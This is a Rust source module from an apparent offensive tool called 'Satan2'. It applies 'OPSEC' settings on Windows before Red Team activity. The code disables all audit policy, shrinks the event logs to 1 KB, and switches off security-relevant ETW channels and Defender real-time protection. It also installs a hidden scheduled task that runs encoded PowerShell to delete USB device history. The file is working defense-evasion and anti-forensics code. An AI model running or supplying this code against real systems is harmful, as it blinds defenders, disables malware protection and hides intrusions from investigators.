#![cfg(target_os = "windows")]
/*
 * opsec_win.rs — Pre-operation OPSEC hardening (nolog / stealth mode)
 *
 * Prevents trace generation rather than destroying existing traces.
 * Apply before any Red Team activity starts; revert when done.
 *
 * Actions applied by apply_opsec_win():
 *   1.  Audit policy     — disable all success/failure subcategories (auditpol)
 *   2.  Event log caps   — shrink Application/System/Security/Setup to 1 KB via MaxSize
 *   3.  ETW channels     — wevtutil /e:false for verbose operational channels
 *   4.  Telemetry        — stop/disable DiagTrack + dmwappushservice,
 *                           AllowTelemetry=0 registry policy, hosts null-route
 *   5.  Defender         — DisableAntiSpyware + DisableRealtimeMonitoring policy keys
 *                           + PowerShell Set-MpPreference fallback
 *   6.  Pagefile         — ClearPageFileAtShutdown=1 (kernel zeroes pagefile on shutdown)
 *   7.  Prefetch         — EnablePrefetcher=0 registry + stop/disable SysMain service
 *   8.  Explorer         — Start_TrackProgs=0, Start_TrackDocs=0, DisableThumbnailCache=1
 *   9.  WER              — Windows Error Reporting disabled=1 via policy registry
 *  10.  USB task         — scheduled task \Satan2\UsbClean triggered on logoff + hourly;
 *                           removes stale USB device registry entries via PowerShell
 *
 * Requires local administrator rights (SeBackupPrivilege for some registry writes).
 */

use std::io::Write;
use std::process::Command;
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegDeleteValueW, RegOpenKeyExW,
    RegSetValueExW, HKEY, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE,
    KEY_CREATE_SUB_KEY, KEY_SET_VALUE, KEY_WOW64_64KEY,
    REG_DWORD, REG_OPTION_NON_VOLATILE,
};

// ── Registry helpers ──────────────────────────────────────────────────────────

/// Encode a UTF-8 string as a null-terminated UTF-16 slice (PCWSTR).
fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Create (or open) a registry key for writing. Returns the handle or None on failure.
/// RegCreateKeyExW creates all missing intermediate keys automatically.
unsafe fn reg_create(root: HKEY, subkey: &str) -> Option<HKEY> {
    let path = wide(subkey);
    let mut hkey: HKEY = 0;
    let mut disp: u32 = 0;
    let r = RegCreateKeyExW(
        root,
        path.as_ptr(),
        0,
        std::ptr::null_mut(),                             // lpClass: unused
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_CREATE_SUB_KEY | KEY_WOW64_64KEY,
        std::ptr::null(),                                  // default security
        &mut hkey,
        &mut disp,
    );
    if r != 0 { None } else { Some(hkey) }
}

/// Write a REG_DWORD value, creating the key path if absent.
unsafe fn set_dword(
    root: HKEY,
    subkey: &str,
    value: &str,
    data: u32,
) -> bool {
    let hkey = match reg_create(root, subkey) {
        Some(k) => k,
        None => return false,
    };
    let val_w = wide(value);
    let bytes = data.to_le_bytes();
    let r = RegSetValueExW(hkey, val_w.as_ptr(), 0, REG_DWORD, bytes.as_ptr(), 4);
    RegCloseKey(hkey);
    r == 0
}

/// Delete a registry value. Returns true if deleted or already absent.
unsafe fn del_reg_value(root: HKEY, subkey: &str, value: &str) -> bool {
    let path = wide(subkey);
    let mut hkey: HKEY = 0;
    let r = RegOpenKeyExW(
        root, path.as_ptr(), 0,
        KEY_SET_VALUE | KEY_WOW64_64KEY, &mut hkey,
    );
    if r != 0 {
        return true; // key absent — value already gone
    }
    let val_w = wide(value);
    let r = RegDeleteValueW(hkey, val_w.as_ptr());
    RegCloseKey(hkey);
    r == 0 || r == 2 // 0 = success, 2 = ERROR_FILE_NOT_FOUND (already absent)
}

// ── 1. Audit policy ───────────────────────────────────────────────────────────

/// Disable all audit subcategory success + failure recording system-wide.
fn disable_audit_policy(verbose: bool) -> bool {
    let ok = Command::new("auditpol")
        .args(["/set", "/subcategory:*", "/success:disable", "/failure:disable"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if ok {
        eprintln!("[+] opsec_win: audit policy — all subcategories disabled");
    } else {
        eprintln!("[!] opsec_win: auditpol failed (may need admin)");
    }
    if verbose && ok {
        eprintln!("[*] opsec_win: audit: success+failure recording suppressed");
    }
    ok
}

/// Restore audit policy to Windows defaults (enough for baseline monitoring).
fn revert_audit_policy() {
    // Re-enable a minimal set of commonly required subcategories
    let subcats = [
        "Logon",
        "Logoff",
        "Account Logon",
        "Account Management",
        "Policy Change",
        "Privilege Use",
        "System",
    ];
    for sub in &subcats {
        let _ = Command::new("auditpol")
            .args(["/set", &format!("/subcategory:{}", sub),
                   "/success:enable", "/failure:enable"])
            .status();
    }
    eprintln!("[+] opsec_win: audit policy reverted to baseline subcategories");
}

// ── 2. Event log channel size caps ────────────────────────────────────────────

/// Classic Windows event log names to cap at 1 KB via Group Policy registry.
static CLASSIC_LOG_NAMES: &[&str] = &["Application", "System", "Security", "Setup"];

/// Set MaxSize=1 (1 KB) for each classic log under the EventLog policy key.
/// With 1 KB, the log overwrites itself almost immediately and holds near-zero events.
fn shrink_eventlog_maxsize() -> u32 {
    let mut ok = 0u32;
    for log in CLASSIC_LOG_NAMES {
        let key = format!(r"SOFTWARE\Policies\Microsoft\Windows\EventLog\{}", log);
        let done = unsafe {
            set_dword(HKEY_LOCAL_MACHINE, &key, "MaxSize", 1)
        };
        if done { ok += 1; }
    }
    eprintln!("[+] opsec_win: event log MaxSize=1 KB applied to {}/{} logs",
        ok, CLASSIC_LOG_NAMES.len());
    ok
}

fn revert_eventlog_maxsize() {
    for log in CLASSIC_LOG_NAMES {
        let key = format!(r"SOFTWARE\Policies\Microsoft\Windows\EventLog\{}", log);
        unsafe { del_reg_value(HKEY_LOCAL_MACHINE, &key, "MaxSize"); }
    }
    eprintln!("[+] opsec_win: event log MaxSize policy removed");
}

// ── 3. ETW channel disable ────────────────────────────────────────────────────

/// Verbose ETW channels that generate high-value forensic events.
/// Disabling them prevents future event generation without affecting the service itself.
static VERBOSE_ETW_CHANNELS: &[&str] = &[
    "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational",
    "Microsoft-Windows-WMI-Activity/Operational",
    "Microsoft-Windows-AppLocker/EXE and DLL",
    "Microsoft-Windows-AppLocker/MSI and Script",
    "Microsoft-Windows-Windows Defender/Operational",
];

fn set_etw_channel_state(channel: &str, enabled: bool) -> bool {
    let flag = if enabled { "true" } else { "false" };
    Command::new("wevtutil")
        .args(["sl", channel, &format!("/e:{}", flag)])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn disable_verbose_etw_channels(verbose: bool) -> u32 {
    let mut ok = 0u32;
    for ch in VERBOSE_ETW_CHANNELS {
        if set_etw_channel_state(ch, false) {
            ok += 1;
            if verbose { eprintln!("[+] opsec_win: ETW disabled: {}", ch); }
        } else {
            // Channel may not be present on all SKUs — not a hard failure
            if verbose { eprintln!("[*] opsec_win: ETW skip (not present): {}", ch); }
        }
    }
    eprintln!("[+] opsec_win: ETW channels disabled: {}/{}", ok, VERBOSE_ETW_CHANNELS.len());
    ok
}

fn revert_verbose_etw_channels(verbose: bool) {
    for ch in VERBOSE_ETW_CHANNELS {
        set_etw_channel_state(ch, true);
        if verbose { eprintln!("[+] opsec_win: ETW re-enabled: {}", ch); }
    }
}

// ── 4. Telemetry block ────────────────────────────────────────────────────────

/// Microsoft telemetry endpoints to null-route via the hosts file.
static TELEMETRY_HOSTS: &[&str] = &[
    "0.0.0.0 vortex.data.microsoft.com",
    "0.0.0.0 vortex1.data.microsoft.com",
    "0.0.0.0 vortex2.data.microsoft.com",
    "0.0.0.0 telemetry.microsoft.com",
    "0.0.0.0 settings-win.data.microsoft.com",
    "0.0.0.0 watson.microsoft.com",
    "0.0.0.0 watson.telemetry.microsoft.com",
    "0.0.0.0 sqm.microsoft.com",
    "0.0.0.0 df.telemetry.microsoft.com",
    "0.0.0.0 oca.telemetry.microsoft.com",
    "0.0.0.0 reports.wes.df.telemetry.microsoft.com",
    "0.0.0.0 telecommand.telemetry.microsoft.com",
];

const HOSTS_PATH: &str = r"C:\Windows\System32\drivers\etc\hosts";
const HOSTS_MARKER: &str = "# satan2-opsec-telemetry-block";

/// Stop and disable a Windows service by name. Ignores stop errors (may already be stopped).
fn stop_disable_service(name: &str) -> bool {
    let _ = Command::new("sc").args(["stop", name]).status();
    Command::new("sc")
        .args(["config", name, "start=", "disabled"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn start_enable_service(name: &str, start_type: &str) {
    let _ = Command::new("sc")
        .args(["config", name, "start=", start_type])
        .status();
    let _ = Command::new("sc").args(["start", name]).status();
}

fn block_telemetry_services() -> bool {
    let mut ok = true;
    for svc in &["DiagTrack", "dmwappushservice"] {
        let r = stop_disable_service(svc);
        if r {
            eprintln!("[+] opsec_win: telemetry service stopped+disabled: {}", svc);
        } else {
            eprintln!("[!] opsec_win: service disable failed (may not exist): {}", svc);
            // Not a hard failure — dmwappushservice is absent on some Win10 builds
        }
        ok &= r;
    }
    ok
}

fn set_telemetry_policy_zero() -> bool {
    let ok = unsafe {
        set_dword(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows\DataCollection",
            "AllowTelemetry",
            0,
        )
    };
    if ok {
        eprintln!("[+] opsec_win: AllowTelemetry = 0 (policy)");
    } else {
        eprintln!("[!] opsec_win: failed to set AllowTelemetry registry key");
    }
    ok
}

/// Append null-routes for Microsoft telemetry endpoints to the hosts file.
/// Uses a marker comment to identify our block for later revert.
fn block_telemetry_hosts() -> bool {
    let current = std::fs::read_to_string(HOSTS_PATH).unwrap_or_default();

    // Already applied — avoid duplicates
    if current.contains(HOSTS_MARKER) {
        eprintln!("[*] opsec_win: telemetry hosts block already present");
        return true;
    }

    let mut block = String::new();
    if !current.ends_with('\n') && !current.is_empty() {
        block.push('\n');
    }
    block.push_str(HOSTS_MARKER);
    block.push('\n');
    for entry in TELEMETRY_HOSTS {
        block.push_str(entry);
        block.push('\n');
    }

    match std::fs::OpenOptions::new().append(true).open(HOSTS_PATH) {
        Ok(mut f) => match f.write_all(block.as_bytes()) {
            Ok(()) => {
                eprintln!("[+] opsec_win: {} telemetry endpoints null-routed in hosts",
                    TELEMETRY_HOSTS.len());
                true
            }
            Err(e) => {
                eprintln!("[!] opsec_win: hosts write failed: {}", e);
                false
            }
        },
        Err(e) => {
            eprintln!("[!] opsec_win: hosts open failed: {}", e);
            false
        }
    }
}

fn revert_telemetry_hosts() {
    let content = match std::fs::read_to_string(HOSTS_PATH) {
        Ok(c) => c,
        Err(_) => return,
    };

    // Collect the hostnames we added so we can filter by them too
    let blocked_hosts: Vec<&str> = TELEMETRY_HOSTS
        .iter()
        .filter_map(|e| e.split_whitespace().nth(1))
        .collect();

    let filtered: Vec<&str> = content
        .lines()
        .filter(|line| {
            // Remove our marker comment
            if line.trim() == HOSTS_MARKER { return false; }
            // Remove lines that contain any of our blocked hostnames
            !blocked_hosts.iter().any(|h| line.contains(h))
        })
        .collect();

    let out = filtered.join("\n") + "\n";
    match std::fs::write(HOSTS_PATH, out.as_bytes()) {
        Ok(()) => eprintln!("[+] opsec_win: telemetry hosts block removed"),
        Err(e) => eprintln!("[!] opsec_win: hosts revert failed: {}", e),
    }
}

// ── 5. Defender real-time protection ─────────────────────────────────────────

/// Disable Defender via Group Policy registry keys (persists across Defender updates).
/// These are policy-path values that override Defender's own settings.
fn disable_defender_policy() -> bool {
    let mut ok = true;
    // Master kill switch — disables the anti-spyware engine entirely
    ok &= unsafe {
        set_dword(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender",
            "DisableAntiSpyware",
            1,
        )
    };
    // Real-time monitoring disable — more targeted, survives some policy resets
    ok &= unsafe {
        set_dword(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
            "DisableRealtimeMonitoring",
            1,
        )
    };
    if ok {
        eprintln!("[+] opsec_win: Defender policy keys set (DisableAntiSpyware + DisableRealtimeMonitoring)");
    } else {
        eprintln!("[!] opsec_win: one or more Defender policy registry writes failed");
    }
    ok
}

/// PowerShell fallback for real-time monitoring disable (works even without policy support).
fn disable_defender_ps() -> bool {
    let ok = Command::new("powershell")
        .args([
            "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
        ])
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if ok {
        eprintln!("[+] opsec_win: Defender real-time monitoring disabled via Set-MpPreference");
    } else {
        eprintln!("[!] opsec_win: Set-MpPreference failed (Defender may be managed by Intune)");
    }
    ok
}

fn revert_defender() {
    // Delete policy overrides — Defender will re-evaluate its own settings
    unsafe {
        del_reg_value(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender",
            "DisableAntiSpyware",
        );
        del_reg_value(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
            "DisableRealtimeMonitoring",
        );
    }
    let _ = Command::new("powershell")
        .args([
            "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring $false",
        ])
        .status();
    eprintln!("[+] opsec_win: Defender policy reverted");
}

// ── 6. Pagefile — clear at shutdown ──────────────────────────────────────────

const MEMMAN_KEY: &str =
    r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management";

fn set_clear_pagefile_at_shutdown(enable: bool) -> bool {
    let ok = unsafe {
        set_dword(HKEY_LOCAL_MACHINE, MEMMAN_KEY, "ClearPageFileAtShutdown", enable as u32)
    };
    if ok {
        eprintln!("[+] opsec_win: ClearPageFileAtShutdown = {} (takes effect at shutdown)",
            enable as u32);
    } else {
        eprintln!("[!] opsec_win: ClearPageFileAtShutdown registry write failed");
    }
    ok
}

// ── 7. Prefetch / SuperFetch ──────────────────────────────────────────────────

const PREFETCH_KEY: &str =
    r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters";

/// Set EnablePrefetcher=0 (0=disabled, 1=app prefetch, 2=boot, 3=both).
fn disable_prefetch_registry() -> bool {
    let ok = unsafe {
        set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 0)
    };
    if ok {
        eprintln!("[+] opsec_win: EnablePrefetcher = 0");
    } else {
        eprintln!("[!] opsec_win: EnablePrefetcher registry write failed");
    }
    ok
}

fn disable_sysmain() -> bool {
    let ok = stop_disable_service("SysMain");
    if ok {
        eprintln!("[+] opsec_win: SysMain (Superfetch) stopped and disabled");
    } else {
        eprintln!("[!] opsec_win: SysMain disable failed");
    }
    ok
}

fn revert_prefetch() {
    // Re-enable both application and boot prefetching (Windows default = 3)
    unsafe { set_dword(HKEY_LOCAL_MACHINE, PREFETCH_KEY, "EnablePrefetcher", 3); }
    start_enable_service("SysMain", "auto");
    eprintln!("[+] opsec_win: prefetch re-enabled, SysMain started");
}

// ── 8. Explorer no-track ─────────────────────────────────────────────────────

fn set_explorer_notrack() -> bool {
    let mut ok = true;

    // Disable tracking of launched programs in Start menu
    ok &= unsafe {
        set_dword(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            "Start_TrackProgs",
            0,
        )
    };

    // Disable tracking of recently opened documents
    ok &= unsafe {
        set_dword(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            "Start_TrackDocs",
            0,
        )
    };

    // Disable thumbnail cache generation (prevents thumbcache_*.db artifacts)
    ok &= unsafe {
        set_dword(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Policies\Microsoft\Windows\Explorer",
            "DisableThumbnailCache",
            1,
        )
    };

    if ok {
        eprintln!("[+] opsec_win: Explorer no-track keys set (TrackProgs/TrackDocs/ThumbnailCache)");
    } else {
        eprintln!("[!] opsec_win: one or more Explorer registry writes failed");
    }
    ok
}

fn revert_explorer_notrack() {
    unsafe {
        del_reg_value(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            "Start_TrackProgs",
        );
        del_reg_value(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            "Start_TrackDocs",
        );
        del_reg_value(
            HKEY_CURRENT_USER,
            r"SOFTWARE\Policies\Microsoft\Windows\Explorer",
            "DisableThumbnailCache",
        );
    }
    eprintln!("[+] opsec_win: Explorer tracking values removed");
}

// ── 9. WER disable ───────────────────────────────────────────────────────────

fn disable_wer() -> bool {
    let ok = unsafe {
        set_dword(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting",
            "Disabled",
            1,
        )
    };
    if ok {
        eprintln!("[+] opsec_win: Windows Error Reporting disabled via policy");
    } else {
        eprintln!("[!] opsec_win: WER policy registry write failed");
    }
    ok
}

fn revert_wer() {
    unsafe {
        del_reg_value(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting",
            "Disabled",
        );
    }
    eprintln!("[+] opsec_win: WER policy removed");
}

// ── 10. USB artifact cleanup scheduled task ───────────────────────────────────

/// Minimal base64 encoder (no external dependencies).
/// Output is standard base64 with '=' padding.
fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    let mut i = 0;

    while i + 2 < data.len() {
        let a = data[i]     as usize;
        let b = data[i + 1] as usize;
        let c = data[i + 2] as usize;
        out.push(CHARS[a >> 2]                     as char);
        out.push(CHARS[((a & 3) << 4) | (b >> 4)] as char);
        out.push(CHARS[((b & 15) << 2) | (c >> 6)] as char);
        out.push(CHARS[c & 63]                     as char);
        i += 3;
    }
    match data.len() - i {
        1 => {
            let a = data[i] as usize;
            out.push(CHARS[a >> 2]          as char);
            out.push(CHARS[(a & 3) << 4]   as char);
            out.push('=');
            out.push('=');
        }
        2 => {
            let a = data[i]     as usize;
            let b = data[i + 1] as usize;
            out.push(CHARS[a >> 2]                     as char);
            out.push(CHARS[((a & 3) << 4) | (b >> 4)] as char);
            out.push(CHARS[(b & 15) << 2]              as char);
            out.push('=');
        }
        _ => {}
    }
    out
}

/// Encode a PowerShell script as a UTF-16LE base64 string suitable for -EncodedCommand.
fn encode_ps_command(script: &str) -> String {
    let utf16: Vec<u16> = script.encode_utf16().collect();
    let bytes: Vec<u8> = utf16
        .iter()
        .flat_map(|w| w.to_le_bytes())
        .collect();
    base64_encode(&bytes)
}

/// PowerShell script executed by the USB cleanup task.
///
/// Logic:
///   1. Enumerate currently present PnP devices (Status == OK) → instance ID set.
///   2. Walk USBSTOR and USB registry subtrees; for each device instance subkey,
///      check whether its instance ID appears in the present-device set.
///   3. Delete entries not in the set (phantom devices / stale history).
///   4. Clear Windows Portable Devices history unconditionally (always historical).
///
/// Uses Microsoft.Win32.Registry for reliable subkey deletion and to avoid
/// PS drive path escaping issues with backslashes in registry paths.
const USB_CLEANUP_PS: &str = r#"
$present = @(Get-PnpDevice -EA SilentlyContinue |
    Where-Object { $_.Status -eq 'OK' } |
    ForEach-Object { $_.InstanceId.ToUpper() });
foreach ($base in @(
    'SYSTEM\CurrentControlSet\Enum\USBSTOR',
    'SYSTEM\CurrentControlSet\Enum\USB',
    'SOFTWARE\Microsoft\Windows Portable Devices\Devices'
)) {
    try {
        $root = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($base, $true);
        if ($null -eq $root) { continue }
        foreach ($cls in @($root.GetSubKeyNames())) {
            try {
                $clsKey = $root.OpenSubKey($cls, $true);
                foreach ($inst in @($clsKey.GetSubKeyNames())) {
                    $id = ($cls + '\' + $inst).ToUpper();
                    $keep = $present | Where-Object { $_ -like "*$id*" };
                    if (-not $keep) {
                        try { $clsKey.DeleteSubKeyTree($inst, $false) } catch {}
                    }
                }
                $clsKey.Close()
            } catch {}
        }
        $root.Close()
    } catch {}
}
"#;

/// Generate the Task Scheduler XML for the USB cleanup task.
/// Uses -EncodedCommand to avoid XML/shell escaping issues with the PS script.
fn generate_usb_task_xml() -> String {
    let encoded = encode_ps_command(USB_CLEANUP_PS);

    // Arguments string: no special XML chars, no quoting issues
    let args = format!(
        "-NonInteractive -WindowStyle Hidden -EncodedCommand {}",
        encoded
    );

    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Satan2: remove stale USB device registry artifacts on logoff and hourly</Description>
    <Author>Satan2</Author>
  </RegistrationInfo>
  <Triggers>
    <!-- Trigger on interactive console logoff (lock screen / logoff) -->
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>ConsoleDisconnect</StateChange>
    </SessionStateChangeTrigger>
    <!-- Trigger on remote desktop session disconnect -->
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>RemoteDisconnect</StateChange>
    </SessionStateChangeTrigger>
    <!-- Hourly timer as belt-and-suspenders fallback -->
    <TimeTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <!-- HighestAvailable = administrator token when available, UAC-elevated -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT5M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>{}</Arguments>
    </Exec>
  </Actions>
</Task>"#,
        args
    )
}

const USB_TASK_NAME: &str = r"\Satan2\UsbClean";

/// Write the task XML to a temp file, register it via schtasks.exe, then delete the file.
fn install_usb_cleanup_task(verbose: bool) -> bool {
    let xml = generate_usb_task_xml();
    let xml_path = r"C:\Windows\Temp\satan2_usb_task.xml";

    // Write XML to temp path
    if let Err(e) = std::fs::write(xml_path, xml.as_bytes()) {
        eprintln!("[!] opsec_win: USB task XML write failed: {}", e);
        return false;
    }

    // Register the task — /f overwrites any existing task with the same name
    let ok = Command::new("schtasks")
        .args(["/create", "/f", "/xml", xml_path, "/tn", USB_TASK_NAME])
        .status()
        .map(|s| s.success())
        .unwrap_or(false);

    // Delete temp XML regardless of outcome (remove the artifact)
    let _ = std::fs::remove_file(xml_path);

    if ok {
        eprintln!("[+] opsec_win: USB cleanup task installed: {}", USB_TASK_NAME);
    } else {
        eprintln!("[!] opsec_win: schtasks /create failed for {}", USB_TASK_NAME);
    }
    if verbose && ok {
        eprintln!("[*] opsec_win: USB task triggers: ConsoleDisconnect, RemoteDisconnect, PT1H");
    }
    ok
}

fn remove_usb_cleanup_task() {
    let _ = Command::new("schtasks")
        .args(["/delete", "/tn", USB_TASK_NAME, "/f"])
        .status();
    // Also try to remove the parent \Satan2\ folder if empty
    let _ = Command::new("schtasks")
        .args(["/delete", "/tn", r"\Satan2", "/f"])
        .status();
    eprintln!("[+] opsec_win: USB cleanup task removed");
}

// ── Public API ────────────────────────────────────────────────────────────────

#[derive(Debug, Default)]
pub struct OpsecWinStats {
    /// Audit policy all-disable succeeded
    pub audit_disabled:     bool,
    /// Number of ETW operational channels successfully disabled
    pub etw_channels_off:   u32,
    /// Telemetry services stopped, policy set, hosts updated
    pub telemetry_blocked:  bool,
    /// Defender real-time protection policy + PS fallback applied
    pub defender_disabled:  bool,
    /// ClearPageFileAtShutdown = 1 set in registry
    pub pagefile_clear_set: bool,
    /// Prefetch registry disabled + SysMain stopped
    pub prefetch_disabled:  bool,
    /// Explorer tracking keys set (TrackProgs/TrackDocs/ThumbnailCache)
    pub explorer_notrack:   bool,
    /// WER policy disabled
    pub wer_disabled:       bool,
    /// USB cleanup scheduled task installed
    pub usb_task_installed: bool,
    /// Cumulative count of non-fatal failures
    pub errors:             u32,
}

/// Apply all OPSEC hardening measures.
///
/// Call this before starting any Red Team activity. Most settings survive reboot.
/// Registry policy keys take effect immediately (no reboot needed for most).
/// ClearPageFileAtShutdown only activates on the next system shutdown.
pub fn apply_opsec_win(verbose: bool) -> OpsecWinStats {
    let mut s = OpsecWinStats::default();

    // 1. Audit policy
    eprintln!("[*] opsec_win: [1/9] disabling audit policy...");
    s.audit_disabled = disable_audit_policy(verbose);
    if !s.audit_disabled { s.errors += 1; }

    // 2. Event log size caps + 3. ETW channel disable
    eprintln!("[*] opsec_win: [2/9] shrinking event log channels...");
    let log_capped = shrink_eventlog_maxsize();
    if log_capped < CLASSIC_LOG_NAMES.len() as u32 { s.errors += 1; }

    eprintln!("[*] opsec_win: [3/9] disabling verbose ETW channels...");
    s.etw_channels_off = disable_verbose_etw_channels(verbose);
    // Not an error if some channels are absent on this SKU

    // 4. Telemetry
    eprintln!("[*] opsec_win: [4/9] blocking telemetry...");
    let svc_ok  = block_telemetry_services();
    let pol_ok  = set_telemetry_policy_zero();
    let host_ok = block_telemetry_hosts();
    s.telemetry_blocked = svc_ok && pol_ok && host_ok;
    if !s.telemetry_blocked { s.errors += 1; }

    // 5. Defender
    eprintln!("[*] opsec_win: [5/9] disabling Defender real-time protection...");
    let def_reg = disable_defender_policy();
    let def_ps  = disable_defender_ps();
    s.defender_disabled = def_reg || def_ps; // either method suffices
    if !s.defender_disabled { s.errors += 1; }

    // 6. Pagefile
    eprintln!("[*] opsec_win: [6/9] setting ClearPageFileAtShutdown...");
    s.pagefile_clear_set = set_clear_pagefile_at_shutdown(true);
    if !s.pagefile_clear_set { s.errors += 1; }

    // 7. Prefetch
    eprintln!("[*] opsec_win: [7/9] disabling prefetch / SysMain...");
    let pf_reg = disable_prefetch_registry();
    let pf_svc = disable_sysmain();
    s.prefetch_disabled = pf_reg && pf_svc;
    if !s.prefetch_disabled { s.errors += 1; }

    // 8. Explorer no-track
    eprintln!("[*] opsec_win: [8/9] configuring Explorer no-track...");
    s.explorer_notrack = set_explorer_notrack();
    if !s.explorer_notrack { s.errors += 1; }

    // 9. WER disable
    // (also sets WER for the session before USB task since task XML write could trigger WER)
    let wer = disable_wer();
    s.wer_disabled = wer;
    if !s.wer_disabled { s.errors += 1; }

    // 10. USB cleanup task
    eprintln!("[*] opsec_win: [9/9] installing USB artifact cleanup task...");
    s.usb_task_installed = install_usb_cleanup_task(verbose);
    if !s.usb_task_installed { s.errors += 1; }

    eprintln!("[+] opsec_win: apply complete — {} error(s)", s.errors);
    if verbose {
        eprintln!("[*] opsec_win: stats: {:?}", s);
    }
    s
}

/// Undo all reversible OPSEC settings applied by apply_opsec_win().
///
/// Note: audit policy is restored to a baseline set of subcategories rather than
/// the exact pre-apply state (original state was not saved).
/// ClearPageFileAtShutdown is reverted but already-queued zeroing is not cancelled.
pub fn revert_opsec_win(verbose: bool) {
    eprintln!("[*] opsec_win: reverting OPSEC hardening...");

    // 1. Audit policy — restore baseline
    revert_audit_policy();

    // 2+3. Event log size + ETW channels
    revert_eventlog_maxsize();
    revert_verbose_etw_channels(verbose);

    // 4. Telemetry
    for svc in &["DiagTrack", "dmwappushservice"] {
        start_enable_service(svc, "demand");
    }
    unsafe {
        del_reg_value(
            HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows\DataCollection",
            "AllowTelemetry",
        );
    }
    revert_telemetry_hosts();

    // 5. Defender
    revert_defender();

    // 6. Pagefile
    set_clear_pagefile_at_shutdown(false);

    // 7. Prefetch
    revert_prefetch();

    // 8. Explorer
    revert_explorer_notrack();

    // 9. WER
    revert_wer();

    // 10. USB task
    remove_usb_cleanup_task();

    eprintln!("[+] opsec_win: revert complete");
}
